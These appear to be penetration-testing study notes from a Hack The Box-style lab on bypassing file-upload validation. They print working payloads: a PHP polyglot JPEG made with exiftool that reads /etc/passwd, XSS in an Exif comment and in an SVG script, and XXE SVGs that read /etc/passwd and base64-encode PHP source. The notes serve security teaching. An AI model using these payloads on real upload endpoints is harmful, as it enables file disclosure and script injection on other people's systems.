Instead of implicitly trusting the `Content-Type` HTTP header, most secure websites try to verify the contents of the file or the specific sequence of bytes in the file's header or footer.

In cases of an image upload function, some applications might try to verify certain properties of an image, such as its dimensions. So if an attacker is trying to upload a PHP script, which doesn't have dimensions, the application can recognize this and reject the upload accordingly.

In other cases, an application might try to verify a file's magic bytes - which is a sequence of bytes in a file's header of footer used as a fingerprint or signature to determine whether the file contents match the expected file type. For example, JPEG files always begin with the bytes `FF D8 FF`. An attacker can use `hexedit` to modify the file's magic bytes based on a [public list](https://en.wikipedia.org/wiki/List_of_file_signatures) of file signatures.

However, even the most robust way of validating a file isn't foolproof. Special tools such as `ExifTool`, can be used to create polyglot JPEG file containing malicious code within its metadata. For example:
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" image.jpg -o polyglot.php
```
## Chaining File Upload Vulnerabilities with XSS and XXE
The technique can also be used to introduce different vulnerabilities via file upload. These includes XSS, XXE, or DoS.
### XSS via Exif Comment
```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```
### XSS via SVG
Save the following as `HTB.svg` and upload it.
```svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
### XXE
Save the following as `HTB.svg` and upload it.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
XXE can also be used to read source code in PHP web applications using the following:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```